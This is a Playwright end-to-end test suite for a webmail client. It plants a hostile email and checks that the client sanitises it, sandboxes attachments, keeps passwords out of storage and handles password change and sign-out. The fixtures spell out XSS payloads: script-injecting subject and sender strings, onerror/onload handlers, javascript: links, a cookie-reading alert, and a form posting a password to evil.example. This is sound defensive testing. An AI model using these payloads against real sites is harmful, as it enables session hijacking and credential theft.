// Webmail in a real browser: sign-in, safe display of hostile email, attachments,
// replying, sending, password change and sign-out.
const { test, before, after } = require('node:test');
const assert = require('node:assert/strict');
const { chromium } = require('playwright');
const h = require('./helpers');

const ATTACK_SUBJECT = "Invoice x');window.__pwned=1;//";
const ATTACK_HTML = `<html><head><style>.t{color:#b00}</style><script>parent.__pwned=4</script></head><body>
  <h2 class="t">Quarterly report</h2>
  <p>See <a href="https://example.com/r">the report</a> and <a href="javascript:parent.__pwned=5">this</a>.</p>
  <img src="https://tracker.example/pixel.gif" width="1" height="1">
  <img src="x" onerror="parent.__pwned=3"><svg onload="parent.__pwned=6"></svg>
  <form action="https://evil.example/steal"><input name="password"></form>
  <iframe src="https://evil.example/"></iframe></body></html>`;
let user, browser, page;
const pageErrors = [];
const outside = [];
let dialogs = 0;

before(async () => {
  await h.waitHealthy();
  user = await h.createTestUser('web');
  const s = await h.login(user.email, user.password, { 'x-forwarded-for': '198.51.100.20' });
  const acct = await h.primaryAccount(s.cookie);
  const [[, boxes]] = await h.mail(s.cookie, [['Mailbox/query', { accountId: acct, filter: { role: 'inbox' } }, 'm']]);
  const blob = await h.upload(s.cookie, acct, '<script>alert(document.cookie)</script>', 'text/html');
  const res = await h.mail(s.cookie, [['Email/set', { accountId: acct, create: {
    e: {
      mailboxIds: { [boxes.ids[0]]: true },
      subject: ATTACK_SUBJECT,
      from: [{ name: "Bob x');window.__pwned=2;//", email: 'bob@evil.example' }],
      to: [{ email: user.email }, { email: 'colleague@partner.example' }],
      bodyValues: { b: { value: ATTACK_HTML } },
      htmlBody: [{ partId: 'b', type: 'text/html' }],
      attachments: [{ blobId: blob.blobId, type: 'text/html', name: 'invoice.html', disposition: 'attachment' }]
    }
  } }, 'e']]);
  assert.ok(res[0][1].created && res[0][1].created.e, 'attack email planted');
  await h.gw('/auth/logout', { method: 'POST', cookie: s.cookie });

  browser = await chromium.launch();
  page = await browser.newPage({ viewport: { width: 1360, height: 860 } });
  page.on('pageerror', e => pageErrors.push(e.message));
  page.on('dialog', d => { dialogs++; d.dismiss(); });
  page.on('request', r => { const u = r.url(); if (!u.startsWith(h.BASE) && !u.startsWith('blob:') && !u.startsWith('data:') && u !== 'about:srcdoc') outside.push(u); });
});

after(async () => {
  if (browser) await browser.close();
  await h.deleteTestUser(user);
});

async function signIn(password) {
  await page.goto(h.BASE + '/');
  await page.waitForSelector('#loginScreen.open');
  await page.fill('#loginEmail', user.email);
  await page.fill('#loginPassword', password);
  await page.click('#loginSubmitBtn');
  await page.waitForFunction(() => !document.querySelector('#loginScreen.open'), null, { timeout: 15000 });
}

test('page has a strict security policy and loads nothing from other sites', async () => {
  const r = await h.gw('/');
  const csp = r.headers.get('content-security-policy') || '';
  assert.match(csp, /script-src 'self'/);
  assert.match(csp, /frame-ancestors 'none'/);
  assert.match(csp, /object-src 'none'/);
  assert.ok(!/fonts\.googleapis|fonts\.gstatic/.test(r.text), 'no third-party fonts');
  assert.ok(!/onclick=|onload=|<script>(?!\s*<\/script>)/i.test(r.text), 'no inline scripts or handlers');
});

test('sign-in keeps the password out of browser storage', async () => {
  await page.goto(h.BASE + '/');
  await page.evaluate(() => localStorage.setItem('iron_id_auth', 'someone:old-saved-password'));
  await signIn(user.password);
  await page.waitForSelector('.email-item');
  const stored = await page.evaluate(() => JSON.stringify({ ...localStorage }) + JSON.stringify({ ...sessionStorage }) + document.cookie);
  assert.ok(!stored.includes(user.password), 'password not stored');
  assert.ok(!stored.includes('iron_id_auth'), 'old saved password wiped');
  assert.ok(!stored.includes('iid_session'), 'session cookie not readable by scripts');
  const ck = (await page.context().cookies()).find(c => c.name === 'iid_session');
  assert.ok(ck && ck.httpOnly && ck.sameSite === 'Strict');
});

test('hostile HTML email is shown safely: no scripts, forms, frames or tracking pixels', async () => {
  await page.locator('.email-item', { hasText: 'Invoice' }).first().click();
  await page.waitForSelector('iframe.mail-frame');
  await page.waitForTimeout(500);
  const reader = await page.textContent('#readerPane');
  assert.ok(reader.includes(ATTACK_SUBJECT), 'subject shown as plain text');
  const frame = page.frames().find(f => f !== page.mainFrame());
  const html = await frame.content();
  assert.ok(!/<script|onerror|onload|<form|<iframe|javascript:/i.test(html), 'dangerous parts removed');
  assert.ok(!/tracker\.example/.test(html), 'tracking pixel held back');
  assert.ok(html.includes('Quarterly report'), 'content still shown');
  const sandbox = await page.getAttribute('iframe.mail-frame', 'sandbox');
  assert.ok(!sandbox.includes('allow-scripts'), 'frame cannot run scripts');
  assert.ok(await page.isVisible('.notice:has-text("Pictures from the internet")'), 'privacy notice shown');
  assert.equal(await page.evaluate(() => window.__pwned), undefined, 'attack code did not run');
  assert.deepEqual(outside, [], 'nothing loaded from other sites');
});

test('hostile attachment downloads inside a sandbox instead of opening on the site', async () => {
  const href = await page.getAttribute('#readerPane a.att', 'href');
  const cookie = (await page.context().cookies()).find(c => c.name === 'iid_session').value;
  for (const url of [href, href + '&inline=1']) {
    const r = await h.gw(url, { cookie });
    assert.equal(r.status, 200);
    assert.match(r.headers.get('content-disposition') || '', /^attachment/);
    assert.match(r.headers.get('content-security-policy') || '', /sandbox/);
    assert.equal(r.headers.get('x-content-type-options'), 'nosniff');
    assert.equal(r.headers.get('content-type'), 'application/octet-stream', 'sender-chosen type not trusted');
  }
  // Even asking for a script type gets an opaque file, so it can never run as a script.
  const r = await h.gw(href.replace(/accept=[^&]*/, 'accept=text%2Fjavascript'), { cookie });
  assert.equal(r.headers.get('content-type'), 'application/octet-stream');
});

test('reply buttons fill in the right people', async () => {
  for (const [label, expectTo] of [['Reply', 'bob@evil.example'], ['Reply all', 'colleague@partner.example'], ['Forward', '']]) {
    await page.click(`#readerPane .ev-toolbar button[title="${label}"]`);
    await page.waitForSelector('#composeModal.open');
    const to = await page.inputValue('#cmpTo');
    if (expectTo) assert.ok(to.includes(expectTo), `${label} recipients: ${to}`);
    else assert.equal(to, '');
    assert.ok((await page.inputValue('#cmpSub')).includes('Invoice'), `${label} subject`);
    if (label === 'Forward') assert.equal(await page.locator('#cmpAtt .att').count(), 1, 'forward keeps the attachment');
    await page.click('#cmpDiscard');
    await page.waitForSelector('#composeModal.open', { state: 'detached' });
  }
  assert.equal(await page.evaluate(() => window.__pwned), undefined);
});

test('stays signed in after reload; sending works', async () => {
  await page.reload();
  await page.waitForSelector('.email-item');
  assert.ok(!(await page.isVisible('#loginScreen.open')));
  await page.click('#btnCompose');
  await page.fill('#cmpTo', user.email);
  await page.fill('#cmpSub', 'E2E send test');
  await page.fill('#cmpBody', 'hello from the e2e suite');
  await page.click('#sendBtn');
  await page.waitForFunction(() => /sent/i.test(document.getElementById('toastMsg').textContent), null, { timeout: 15000 });
  await page.waitForSelector('.email-item:has-text("E2E send test")', { timeout: 20000 });
});

test('password change works, old password stops working, other devices are signed out', async () => {
  const next = 'N-' + require('crypto').randomBytes(12).toString('base64url');
  const otherDevice = await h.login(user.email, user.password, { 'x-forwarded-for': '198.51.100.22' });
  assert.equal(otherDevice.status, 200);
  await page.click('#btnSettings');
  await page.click('#stab-security');
  await page.fill('#pwCurrent', 'definitely-wrong');
  await page.fill('#pwNew', next);
  await page.fill('#pwConfirm', next);
  await page.click('#pwSubmitBtn');
  await page.waitForFunction(() => document.getElementById('pwStatus').textContent.length > 0);
  assert.match(await page.textContent('#pwStatus'), /incorrect/i);
  await page.fill('#pwCurrent', user.password);
  await page.fill('#pwNew', next);
  await page.fill('#pwConfirm', next);
  await page.click('#pwSubmitBtn');
  await page.waitForFunction(() => /changed/i.test(document.getElementById('pwStatus').textContent), null, { timeout: 15000 });
  assert.equal((await h.login(user.email, user.password, { 'x-forwarded-for': '198.51.100.21' })).status, 401, 'old password refused');
  assert.equal((await h.login(user.email, next, { 'x-forwarded-for': '198.51.100.21' })).status, 200, 'new password works');
  user.password = next;
  const other = await h.gw('/proxy/jmap/session', { cookie: otherDevice.cookie });
  assert.ok(!other.json.username, 'other device signed out');
  await page.keyboard.press('Escape');
  await page.reload();
  await page.waitForSelector('.email-item');
  assert.ok(!(await page.isVisible('#loginScreen.open')), 'still signed in after the change');
});

test('sign-out sticks; no popups or page errors', async () => {
  await page.click('#btnSignOut');
  await page.waitForSelector('#loginScreen.open');
  await page.reload();
  await page.waitForSelector('#loginScreen.open');
  assert.equal(dialogs, 0, 'no browser popups');
  assert.deepEqual(pageErrors, []);
});
